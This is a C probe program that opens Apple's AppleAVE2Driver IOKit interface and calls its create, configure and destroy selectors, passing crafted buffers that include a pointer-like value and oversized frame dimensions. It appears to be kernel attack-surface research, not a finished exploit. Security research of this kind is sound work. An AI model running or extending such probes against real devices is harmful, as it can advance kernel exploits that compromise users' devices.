/*
 * ave2_probe_create.c v4 — async-transport probe for sel1 create
 *
 * v3 finding: sync struct/scalar/generic all return c2 with untouched out;
 * sel 0/11/12 still give c7 (dispatch table IS reached for those).
 * => c2 for sel1..10 comes from a shared gate AFTER table lookup but BEFORE
 *    handler: the per-selector method-type check. The table entries carry
 *    {checkStructureInputSize<<32|checkStructureOutputSize} — if iOS 26 table
 *    rows mark sel1..10 as kIOUCStructMethod but our trap passes different
 *    flags, IOKit rejects with c2 before the handler runs.
 * Test: async struct transport on sel1 (IOConnectCallAsyncStructMethod) —
 * the async dispatch path validates differently. Also try selector aliases
 * (sel1 with wake port) and verify sel2/destroy responds.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>

#include "iokit_dyn.h"
#include "ave2_wire.h"

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    if (iodyn_init() != 0) { printf("[-] iodyn\n"); return 3; }

    void *m = p_IOServiceMatching("AppleAVE2Driver");
    io_service_t svc = p_IOServiceGetMatchingService(IODYN_MAIN_PORT, m);
    if (!svc) { printf("[-] no service\n"); return 1; }
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), 1, &conn);
    if (kr != KERN_SUCCESS) { printf("[-] open: 0x%x\n", kr); return 2; }
    printf("[+] opened 0x%x\n\n", conn);

    mach_port_t wake = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);

    static uint8_t in[0x1a0a0];
    memset(in, 0, sizeof(in));
    memcpy(in + AVE2_CREATE_OFF_VERSION, "904.76.7", 8);
    *(int32_t *)(in + AVE2_CREATE_OFF_ENCTYPE) = 1;
    *(int32_t *)(in + 0x910) = 1;
    *(int32_t *)(in + 0x914) = 1;
    *(uint64_t *)(in + 0x808) = 0x7000000000000001ULL;

    uint8_t out[0x400];

    printf("=== sel1 via ASYNC struct (wake port) ===\n");
    {
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref));
        aref[0] = (uint64_t)wake;
        size_t osz = 0x100;
        memset(out, 0, sizeof(out));
        kern_return_t k = p_IOConnectCallAsyncStructMethod(conn, 1, wake, aref, 1,
                                                           in, 0x920, out, &osz);
        int touched = 0;
        for (size_t q = 0; q < osz; q++) if (out[q]) { touched = 1; break; }
        printf("  -> 0x%08x osz=%zu touched=%d\n", k, osz, touched);
        if (touched) {
            printf("  out: ");
            for (size_t q = 0; q < osz && q < 0x28; q++) printf("%02x", out[q]);
            printf("\n");
        }
    }

    printf("\n=== sel4 configure via ASYNC struct (in=0x1a0a0) ===\n");
    {
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref));
        aref[0] = (uint64_t)wake;
        static uint8_t cin[0x1a0a0];
        memset(cin, 0, sizeof(cin));
        *(int64_t *)(cin + 0x10) = 0;
        *(int64_t *)(cin + 0x18) = 0;
        *(int64_t *)(cin + 0x20) = 0;
        *(int32_t *)(cin + AVE2_OFF_WIDTH)  = 65520;
        *(int32_t *)(cin + AVE2_OFF_HEIGHT) = 8193;
        size_t osz = 0x100;
        memset(out, 0, sizeof(out));
        kern_return_t k = p_IOConnectCallAsyncStructMethod(conn, 4, wake, aref, 1,
                                                           cin, 0x1a0a0, out, &osz);
        int touched = 0;
        for (size_t q = 0; q < osz; q++) if (out[q]) { touched = 1; break; }
        printf("  -> 0x%08x osz=%zu touched=%d\n", k, osz, touched);
        if (touched) {
            printf("  out: ");
            for (size_t q = 0; q < osz && q < 0x20; q++) printf("%02x", out[q]);
            printf("\n");
        }
    }

    printf("\n=== sel2 destroy via sync struct (in=0x28) ===\n");
    {
        uint8_t din[0x28] = {0};
        size_t osz = 0x100;
        memset(out, 0, sizeof(out));
        kern_return_t k = p_IOConnectCallStructMethod(conn, 2, din, 0x28, out, &osz);
        int touched = 0;
        for (size_t q = 0; q < osz; q++) if (out[q]) { touched = 1; break; }
        printf("  -> 0x%08x osz=%zu touched=%d\n", k, osz, touched);
    }

    mach_port_destroy(mach_task_self(), wake);
    p_IOServiceClose(conn);
    p_IOObjectRelease(svc);
    return 0;
}
